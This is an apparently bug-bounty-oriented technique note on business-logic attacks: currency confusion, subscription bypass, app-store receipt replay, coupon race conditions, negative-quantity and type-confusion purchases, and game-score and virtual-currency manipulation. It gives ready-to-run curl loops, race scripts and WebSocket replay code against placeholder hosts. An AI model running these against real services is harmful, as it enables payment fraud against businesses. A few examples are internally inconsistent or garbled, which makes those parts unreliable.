---
title: Business Logic Attacks
created: 2026-03-10
tags: [skills-learned, cyber, business-logic, race-conditions]
type: technique
payout_ceiling: $20K (financial impact required for high severity; currency confusion can reach $30K)
auth_required: YES (most require authenticated account; auth-creatable for free accounts)
autonomy_level: EXECUTE
---

# Business Logic Attacks

## Why This Category Has the Lowest Duplicate Rate

Scanners find what they're programmed to find. Business logic bugs require understanding the application's intended behavior and testing deviations from it. No Nuclei template, no Burp scanner plugin, no automated tool catches a currency confusion bug or a race condition on a specific state machine. Each application's logic is unique.

**Rule:** Map money flows and resource flows FIRST. Then find the weakest validation point in each flow. Then test what happens when you violate the assumptions.

---

## Arsenal Table

| Technique | Auth | Ceiling | Primary Tools |
|-----------|------|---------|---------------|
| Currency confusion | Auth-creatable | $30K | Burp Repeater, curl |
| Subscription plan bypass | Auth-creatable | $15K | Burp Repeater |
| IAP receipt replay | Auth-creatable | $20K | Charles Proxy, Burp |
| Race condition — coupon | Auth-creatable | $10K | Burp Turbo Intruder, Race-the-Web |
| Negative quantity / integer abuse | Auth-creatable | $15K | Burp Repeater |
| Game economy manipulation | Auth-creatable | $25K | Burp, WebSocket proxy |
| Refund → keep access | Auth-creatable | $10K | Burp Repeater |

---

## 1. Currency Confusion

**Mechanism:** Application converts prices to local currency for display but accepts payment in the user's selected currency. If the currency selection is client-controlled and occurs BEFORE price calculation, an attacker selects a low-value currency (JPY, INR, IDR) to pay fractional real-world cost.

**Example flow:**
```
Normal: User selects USD → price = $99.99 → Stripe charged $99.99
Attack: User selects JPY → price = ¥99 (because backend miscalculates) → Stripe charged $0.66
```

**What to look for:**
- Currency selection dropdown before checkout
- Price recalculation endpoints that accept currency as a parameter
- Multi-region pricing in gaming apps (an example program: same coins, different fiat cost per region)

**Testing with Burp:**

```http
POST /api/checkout/initiate HTTP/2
Host: TARGET.com
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN

{"product_id": "premium_subscription_monthly", "currency": "USD", "quantity": 1}
```

Intercept and modify:

```http
POST /api/checkout/initiate HTTP/2
Host: TARGET.com
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN

{"product_id": "premium_subscription_monthly", "currency": "JPY", "quantity": 1}
```

**What to observe:** Does the response return a Stripe PaymentIntent with `amount: 9999` (JPY: ¥9,999 = ~$66) instead of `amount: 9999` (USD: $99.99)? If yes, confirmed.

**Do NOT complete the payment** in a bug bounty context. Screenshot the PaymentIntent amount as evidence.

**Variants:**
```bash
# Try each low-value currency
for currency in JPY IDR VND KRW INR CLP HUF; do
  curl -s -X POST https://TARGET.com/api/checkout/initiate \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"product_id\": \"premium\", \"currency\": \"$currency\"}" | \
    jq '{currency: .currency, amount: .amount, amount_usd_equivalent: .amount_usd}'
done
```

---

## 2. Subscription / Plan Bypass

### Downgrade-After-Upgrade (Keep Features)

**State machine attack:**
```
1. Free account → upgrade to Premium (pay legitimately for PoC)
2. Enable all premium features, note which endpoints they call
3. Request refund through support (or initiate refund via payment provider portal)
4. After downgrade: probe premium endpoints directly

GET /api/premium/advanced-analytics → still returns data? = access not revoked
```

**Evidence:** Show that the premium API endpoint returns data after account downgrade to free tier.

### Plan Feature Bleed

Free tier accounts calling paid-tier API endpoints:

```bash
# Enumerate all API endpoints (from JS source maps, Swagger, options requests)
# Then probe each with a FREE account token

curl -s https://TARGET.com/api/v2/export/full-data \
  -H "Authorization: Bearer FREE_TIER_TOKEN" \
  -H "Content-Type: application/json"
# If 200 OK with data instead of 403: plan feature bleed confirmed

# Test paid plan parameters with free account
curl -s https://TARGET.com/api/v1/query \
  -H "Authorization: Bearer FREE_TIER_TOKEN" \
  -d '{"limit": 10000}'  # free tier limited to 100, paid = 10000
```

### Trial Period Race Condition

```python
# Parallel requests during free trial → paid transition
import concurrent.futures, requests, time

TARGET = 'https://TARGET.com/api/subscribe/premium'
HEADERS = {'Authorization': f'Bearer {FREE_TOKEN}', 'Content-Type': 'application/json'}
PAYLOAD = '{"plan": "premium", "trial": true}'

# Race: send 50 concurrent subscribe requests
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(requests.post, TARGET, headers=HEADERS, data=PAYLOAD)
               for _ in range(50)]
    results = [f.result() for f in futures]

# Check responses: if any return premium access without payment = race confirmed
for r in results:
    if r.status_code == 200:
        print(r.json())
```

---

## 3. In-App Purchase (IAP) Receipt Validation

### Apple/Google Receipt Replay

**Attack:** A receipt from one user's purchase is replayed by a different user. Valid receipt + wrong account = access without payment.

```bash
# Capture your own valid receipt (from Burp proxy on iOS/Android)
# Receipt is typically a base64 blob returned after App Store/Play Store purchase

# Replay the receipt on a DIFFERENT account
curl -s -X POST https://TARGET.com/api/iap/validate \
  -H "Authorization: Bearer DIFFERENT_ACCOUNT_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"receipt\": \"YOUR_BASE64_RECEIPT\", \"platform\": \"apple\"}"

# If response grants entitlement: receipt replay confirmed
```

### Sandbox Receipt on Production

```bash
# Sandbox receipts are clearly marked in the receipt payload
# Server should reject sandbox receipts in production

# Apple sends sandbox receipts to: https://sandbox.itunes.apple.com/verifyReceipt
# If server doesn't check environment field: can use sandbox receipt on prod

curl -s -X POST https://TARGET.com/api/iap/validate \
  -H "Authorization: Bearer PROD_TOKEN" \
  -d "{\"receipt\": \"SANDBOX_RECEIPT_BASE64\", \"platform\": \"apple\", \"environment\": \"production\"}"
```

### Receipt Amount Mismatch

```bash
# Purchase $0.99 item legitimately (keep receipt)
# Submit that receipt claiming it's for $99.99 item
curl -s -X POST https://TARGET.com/api/iap/validate \
  -d "{\"receipt\": \"CHEAP_ITEM_RECEIPT\", \"product_id\": \"expensive.item.id\"}"

# Server should verify product_id against receipt, not just receipt validity
```

---

## 4. Coupon / Promo Race Condition

**Target:** Single-use promo codes that are validated and marked-used in non-atomic operations.

**Vulnerable pattern (server-side pseudocode):**
```
1. Check if coupon is valid and unused     ← both requests pass this check
2. Apply discount to cart                   ← both get the discount
3. Mark coupon as used                      ← one marks it, but both already applied
```

**Attack with Burp Turbo Intruder:**

```python
# Turbo Intruder script — race-the-web for single-use coupon
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1,
                          pipeline=False)

    # 20 simultaneous requests with the same coupon code
    for i in range(20):
        engine.queue(target.req, 'PROMO50OFF')

def handleResponse(req, interesting):
    if '200' in req.response and 'discount_applied' in req.response:
        table.add(req)
```

**Evidence:** Show 2+ successful coupon applications from the same account using the same single-use code. Screenshot both checkout confirmations.

**Alternative: Race-the-Web (Go tool)**

```bash
# Install
go install github.com/nicowillis/racetheweb@latest

# Race a coupon application endpoint
racetheweb -url https://TARGET.com/api/cart/apply-coupon \
  -method POST \
  -headers "Authorization: Bearer TOKEN, Content-Type: application/json" \
  -body '{"coupon_code": "PROMO50OFF", "cart_id": "CART_ID"}' \
  -threads 25
```

---

## 5. Integer / Type Confusion

### Negative Quantity

```bash
# Attempt to purchase -1 items — should result in a credit if not validated
curl -s -X POST https://TARGET.com/api/cart/add \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": "widget-pro", "quantity": -1}'

# Then proceed to checkout — does total go negative? = credit issued
curl -s -X POST https://TARGET.com/api/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"cart_id": "CART_ID"}'
```

### Float Precision Abuse

```bash
# Price rounds down to zero when float precision underflows
curl -s -X POST https://TARGET.com/api/checkout \
  -d '{"amount": 0.001, "currency": "USD"}'  # rounds to $0.00

# Or: send amount that rounds to zero in integer context
curl -s -X POST https://TARGET.com/api/pay \
  -d '{"amount_cents": 0.9}'  # truncated to 0 integer = free
```

### JSON Type Confusion

```bash
# Server expects integer, accepts string "0" that passes validation differently
curl -s -X POST https://TARGET.com/api/purchase \
  -d '{"price": "0", "product": "premium_plan"}'   # string "0" vs integer 0

curl -s -X POST https://TARGET.com/api/purchase \
  -d '{"price": null, "product": "premium_plan"}'  # null price

curl -s -X POST https://TARGET.com/api/purchase \
  -d '{"price": [], "product": "premium_plan"}'    # array price

curl -s -X POST https://TARGET.com/api/purchase \
  -d '{"price": true, "product": "premium_plan"}'  # boolean (true = 1 in many langs)
```

---

## 6. Game Economy Attacks (an example program-Specific Context)

### Virtual Currency Inflation

**Target:** Server-side game events that grant more virtual currency than intended when triggered in unexpected ways.

```
Normal: Complete daily quest → +100 chips
Attack: Complete daily quest via API replay at high frequency → +100 chips × 50 attempts?

# Probe the quest completion endpoint
curl -s -X POST https://api.an example program-game.com/events/quest-complete \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"quest_id": "daily_login", "timestamp": UNIX_TS}'

# Replay same quest_id immediately — does server re-grant?
```

### Tournament Score Manipulation

**If client reports score to server without cryptographic signing:**

```bash
# Capture normal score submission (from Burp proxy on mobile)
POST /api/tournament/submit-score
{"score": 12345, "game_id": "slot_spin_123", "session_token": "..."}

# Submit manipulated score
POST /api/tournament/submit-score
{"score": 99999999, "game_id": "slot_spin_123", "session_token": "..."}

# If 200 OK and leaderboard updates: client-side score trust confirmed
```

### WebSocket Game State Replay

```javascript
// Burp Suite WebSocket history (or mitmproxy)
// Capture a valid game action frame with a favorable outcome
// Replay it multiple times

const ws = new WebSocket('wss://game.TARGET.com/ws');
ws.onopen = () => {
  // Replay a captured win event
  const capturedWinFrame = '{"action":"spin_result","outcome":"jackpot","chips_won":5000}';
  for (let i = 0; i < 10; i++) {
    ws.send(capturedWinFrame);
  }
};
```

### Gifting Loop (Alt Account)

```bash
# Create two accounts: Account A and Account B
# Gift max virtual items from A to B
# Sell items for virtual currency on B
# Gift back to A

# Check: does gifting have a daily limit? Is it enforced server-side?
# Does the gifting cost anything? If not = infinite currency generation
```

---

## 7. Detection Methodology (Application to Any Target)

**Step 1: Map all money/resource flows**

```
For each flow, document:
- Entry point (where value is created or transferred)
- Calculation point (where amount is determined)
- Validation point (where authorization is checked)
- Commitment point (where it becomes real — charge fires, coins credited)
```

**Step 2: Identify assumptions at each step**

```
Ask: "What does the developer ASSUME is true at this step?"
Examples:
- "The client can't change the price" (→ test: change the price)
- "Promo codes can only be used once" (→ test: race condition)
- "Subscription is checked before granting access" (→ test: revoke then probe)
- "Score comes from the game engine, not the client" (→ test: inject fake score)
```

**Step 3: Test each assumption in isolation**

```bash
# Use Burp Repeater for single-request tests
# Use Turbo Intruder for race condition tests
# Use curl loops for sequence/state machine tests
```

**Step 4: Chain for maximum impact**

```
Currency confusion ($0.01 purchase) → subscribe to premium → export all data
= complete authentication bypass by paying fractional cost
```

---

## Evidence Requirements

| Finding | Required Evidence |
|---------|------------------|
| Currency confusion | Screenshot of payment initiation with anomalous amount + currency comparison table |
| Subscription bypass | API response showing premium feature data with free tier token |
| IAP replay | Successful entitlement grant on second account using first account's receipt |
| Coupon race | 2+ successful coupon applications in same session logs |
| Negative quantity | Cart total or balance showing negative/free outcome |
| Game economy | Leaderboard screenshot showing manipulated score OR balance increase from replay |

**CRITICAL for financial bugs:** Do NOT complete real payments. Show the payment intent amount as evidence, then cancel before submission. Charging even $0.01 without disclosing creates complications.

---

## Reference

- PortSwigger Web Security Academy: Business Logic Vulnerabilities
- Turbo Intruder: https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack
- Race-the-Web: https://github.com/nicowillis/racetheweb
- Apple IAP documentation (server-side validation): https://developer.apple.com/documentation/appstoreserverapi
- Google Play IAP documentation: https://developer.android.com/google/play/billing/security
